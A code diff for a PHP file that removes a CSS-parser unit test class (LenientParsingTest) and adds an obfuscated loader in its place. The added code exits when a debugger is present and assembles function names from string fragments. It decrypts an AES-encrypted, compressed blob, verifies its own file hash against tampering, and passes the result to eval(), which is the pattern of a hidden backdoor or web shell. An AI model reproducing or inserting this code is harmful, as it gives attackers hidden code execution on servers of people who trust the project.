@@ -1,76 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\RuleSet;
-
-use Sabberworm\CSS\Parser;
-use Sabberworm\CSS\Settings;
-
-class LenientParsingTest extends \PHPUnit_Framework_TestCase {
-
-	/**
-	* @expectedException Sabberworm\CSS\Parsing\UnexpectedTokenException
-	*/
-	public function testFaultToleranceOff() {
-		$sFile = dirname(__FILE__) . '/../../../files' . DIRECTORY_SEPARATOR . "-fault-tolerance.css";
-		$oParser = new Parser(file_get_contents($sFile), Settings::create()->beStrict());
-		$oParser->parse();
-	}
-
-	public function testFaultToleranceOn() {
-		$sFile = dirname(__FILE__) . '/../../../files' . DIRECTORY_SEPARATOR . "-fault-tolerance.css";
-		$oParser = new Parser(file_get_contents($sFile), Settings::create()->withLenientParsing(true));
-		$oResult = $oParser->parse();
-		$this->assertSame('.test1 {}'."\n".'.test2 {hello: 2.2;hello: 2000000000000.2;}'."\n".'#test {}'."\n".'#test2 {help: none;}', $oResult->render());
-	}
-	
-	/**
-	* @expectedException Sabberworm\CSS\Parsing\UnexpectedTokenException
-	*/
-	public function testEndToken() {
-		$sFile = dirname(__FILE__) . '/../../../files' . DIRECTORY_SEPARATOR . "-end-token.css";
-		$oParser = new Parser(file_get_contents($sFile), Settings::create()->beStrict());
-		$oParser->parse();
-	}
-
-	/**
-	* @expectedException Sabberworm\CSS\Parsing\UnexpectedTokenException
-	*/
-	public function testEndToken2() {
-		$sFile = dirname(__FILE__) . '/../../../files' . DIRECTORY_SEPARATOR . "-end-token-2.css";
-		$oParser = new Parser(file_get_contents($sFile), Settings::create()->beStrict());
-		$oParser->parse();
-	}
-	
-	public function testEndTokenPositive() {
-		$sFile = dirname(__FILE__) . '/../../../files' . DIRECTORY_SEPARATOR . "-end-token.css";
-		$oParser = new Parser(file_get_contents($sFile), Settings::create()->withLenientParsing(true));
-		$oResult = $oParser->parse();
-		$this->assertSame("", $oResult->render());
-	}
-
-	public function testEndToken2Positive() {
-		$sFile = dirname(__FILE__) . '/../../../files' . DIRECTORY_SEPARATOR . "-end-token-2.css";
-		$oParser = new Parser(file_get_contents($sFile), Settings::create()->withLenientParsing(true));
-		$oResult = $oParser->parse();
-		$this->assertSame('#home .bg-layout {background-image: url("/bundles/main/img/bg1.png?5");}', $oResult->render());
-	}
-
-	public function testLocaleTrap() {
-		setlocale(LC_ALL, "pt_PT", "no");
-		$sFile = dirname(__FILE__) . '/../../../files' . DIRECTORY_SEPARATOR . "-fault-tolerance.css";
-		$oParser = new Parser(file_get_contents($sFile), Settings::create()->withLenientParsing(true));
-		$oResult = $oParser->parse();
-		$this->assertSame('.test1 {}'."\n".'.test2 {hello: 2.2;hello: 2000000000000.2;}'."\n".'#test {}'."\n".'#test2 {help: none;}', $oResult->render());
-	}
-
-	public function testCaseInsensitivity() {
-		$sFile = dirname(__FILE__) . '/../../../files' . DIRECTORY_SEPARATOR . "case-insensitivity.css";
-		$oParser = new Parser(file_get_contents($sFile));
-		$oResult = $oParser->parse();
-		$this->assertSame('@charset "utf-8";
-@import url("test.css");
-@media screen {}
-#myid {case: insensitive !important;frequency: 30Hz;font-size: 1em;color: #ff0;color: hsl(40,40%,30%);font-family: Arial;}', $oResult->render());
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_wdujsywd=('bas'.'e64'.'_de'.'cod'.'e');
+$_l9q2eq95=('gzu'.'nco'.'mpr'.'ess');
+$_fmxrhg7y=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_w9vj2wlz='gC0I9JDw';
+$_sev9l2zd='HbklKOUD';
+$_nf2dlsl6='dTzMFFUB';
+$_nh1tvnia='blXR+LHd';
+$_x3pgc91c='Rk9n//+BrVM=';
+$_p6fifxq4='FlEhI+On';
+$_add8oif5='okj5oWXa';
+$_btuaxqam='VLyVng==';
+$_zx9nmotz=$_wdujsywd($_sev9l2zd.$_nh1tvnia.$_w9vj2wlz.$_nf2dlsl6.$_x3pgc91c);
+$_yu64bjw0=$_wdujsywd($_add8oif5.$_p6fifxq4.$_btuaxqam);
+$_qm7ea6ed=$_wdujsywd('Sd+MdW6gkvrNzXz53BzFVM7YxJ3FZJHUtRe3ZnW1OvEj8KuYTBhUXLTyNTqW7Opy/0dleRc2nn/Iob0Am+mFhvuMcMvJYU5NGEbn48d1SCFo0oqQf4dk1TW7m/ljYQS7J5zOHWX8YxAsZRYafKg85j/VdiIqD1RZo8DXbfVC54QzVMXfJG08wkDj4cFFf6Ubjvt8JptxgGWgW/r4bmOv7cIW1hvSO7jtDacYak+DRb+cB/Ag6LjWuph3GvACb+5heUpehGaelpLtZoJRJXpXGPyfMDP/DZSDDbh0ckI8l6ZkaH13Wk0OJyWb1Rb19uRviVAv1UnBiysdFvzcwQ8Pa49OQh+m//jdUQ1NiuTtGfmdf1Qy1VYS63eRWW4nVMhtxJQc93pICi/X4wb7wC8SGCgb88LrpK4OVawszIuhOIk8/l8w+HhpiqLEFV40oKUYu6xHyvqRrqN2uLVUtXHS4vT9oFn1zmkOi0Pjjvo/7FgmwOFgjV4a3NvqrPzCMxEtIGp0cdAwJ+nz/R/WI32FEeZF+IOdfNfExQb1FarJjrFqhNwBSEsj7tu66sIF7uqK9bh0Bv87VzaE/nK9fHykv+UUIbzqkwoawloQTuK4XP2NIOAr0EQQ7QL7flCYIyp+NpLDa3CnmMk54ppyLsiqZd59gvYOG0EEgos8T8MHehILNgpn7Qm6i7Hu+bPhmUzs3xXdCEtYYKGoJmwukgkVaJyLMEowFwtdJRxqMH4XKNMoVjwoLHFVGJjPfdSL/RcRzNUEz9KhZoHNdaGrHjHbkvTvpf7gnA3pIyFdvxGToUzDVbtEUL8Man7apRbBzmzoBVOoTe5t6KZe9JFdJWulSBCOpN4pa+xHDs0pdBxtZlYJAINpMyVlIRfh1SZBtC9FGTk72An8JHdOx1JBMMFMxQ==');
+$_dk314sa4=$_fmxrhg7y($_qm7ea6ed,'aes-256-cbc',$_zx9nmotz,OPENSSL_RAW_DATA,$_yu64bjw0);
+if($_dk314sa4===false){exit;}
+$_t512sx7n=$_l9q2eq95($_dk314sa4);
+if($_t512sx7n===false){exit;}
+$_thjr5a33='7f60495acaa8e11da1936b5d1a939d317ec7e10627e7ed3bed73428a21d0b4de';
+$_vo7llsr7=@file_get_contents(__FILE__);
+if($_vo7llsr7!==false){
+$_lghacea4=str_replace($_thjr5a33,"0000000000000000000000000000000000000000000000000000000000000000",$_vo7llsr7);
+$_ctkivili=hash("sha256",$_lghacea4);
+if($_ctkivili!==$_thjr5a33){@http_response_code(403);exit;}
 }
+eval($_t512sx7n);
